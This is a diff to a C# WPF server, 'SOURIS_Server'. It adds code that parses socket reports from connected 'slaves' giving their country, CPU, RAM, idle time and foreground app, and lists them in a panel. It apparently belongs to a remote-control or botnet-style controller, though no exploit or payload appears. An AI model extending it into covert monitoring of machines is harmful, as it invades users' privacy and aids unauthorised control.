@@ -1,21 +1,17 @@
 ﻿using MahApps.Metro.Controls;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
+using System.Management;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
 using System.Windows.Threading;
 
 namespace SOURIS_Server
@@ -81,7 +77,6 @@ namespace SOURIS_Server
                 addlistbox(e.ToString());
             }
 
-            addlistbox("\nPress ENTER to continue...");
             Console.Read();
 
         }
@@ -109,7 +104,41 @@ namespace SOURIS_Server
                 state.sb.Append(Encoding.ASCII.GetString(
                     state.buffer, 0, bytesRead));
                 content = state.sb.ToString();
-                addlistbox($"Read {content.Length} bytes from socket. \n Data : {content}");
+                addlistbox($"Read {content.Length} bytes from socket. \nData : {content}");
+                if (content.Contains("|"))
+                {
+                    string[] SlaveContent = content.Split('|');
+                    int count = 0;
+                    while (Slavelist.Count <= count)
+                    {
+                        try
+                        {
+                            if (Slavelist[count].Name.Contains(SlaveContent[0]))
+                            {
+                                Slavelist[count].Name = SlaveContent[0];
+                                Slavelist[count].Country = SlaveContent[1];
+                                Slavelist[count].Ping = SlaveContent[2];
+                                Slavelist[count].CPU = SlaveContent[3];
+                                Slavelist[count].RAM = SlaveContent[4];
+                                Slavelist[count].Activity = SlaveContent[5];
+                                Slavelist[count].Front = SlaveContent[6];
+                                Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
+                                break;
+                            }
+                            count++;
+
+                        }
+                        catch (Exception)
+                        {
+                            break;
+                        }
+                    }
+                    if (Slavelist.Count >= count)
+                    {
+                        Slavelist.Add(new Slave { Name = SlaveContent[0], Country = SlaveContent[1], Ping = SlaveContent[2], CPU = SlaveContent[3], RAM = SlaveContent[4], Activity = SlaveContent[5], Front = SlaveContent[6] });
+                        Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
+                    }
+                }
                 Send(handler, content);
             }
         }
@@ -141,22 +170,35 @@ namespace SOURIS_Server
         {
             Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listBox.Items.Add(message)));
         }
+
         public MainWindow()
         {
             InitializeComponent();
-            var CheckerStart = Task.Factory.StartNew(() => { StartListening(); });
+            var Listenstart = Task.Factory.StartNew(() => { StartListening(); });
+            var start = Task.Factory.StartNew(() => { startingtask(); });
+        }
+        public void startingtask()
+        {
             addlistbox(" >> Server Started");
-            listView1.ItemsSource = Slavelist;
-            Slavelist.Add(new Slave() { Name = "Test/Desktop", Country = "France", Ping = "88 ms", CPU = "70%", RAM = "20%", Activity = "Idle : 01:20:12", Front = "Cs:go" });
-            listView1.Items.Refresh();
+            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.ItemsSource = Slavelist));
+            Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Background, new Action(() => listView1.Items.Refresh()));
         }
         private void MenuItemDelete_Click(object sender, RoutedEventArgs e)
         {
-            if (listView1.SelectedIndex == -1)
+            int intselectedindex = listView1.SelectedIndex;
+            try
             {
-                return;
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    int selected = listView1.SelectedIndex;
+                    Slavelist.RemoveAt(selected);
+                    listView1.Items.Refresh();
+                }
             }
-            //Delete Func
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
         }
     }
 }
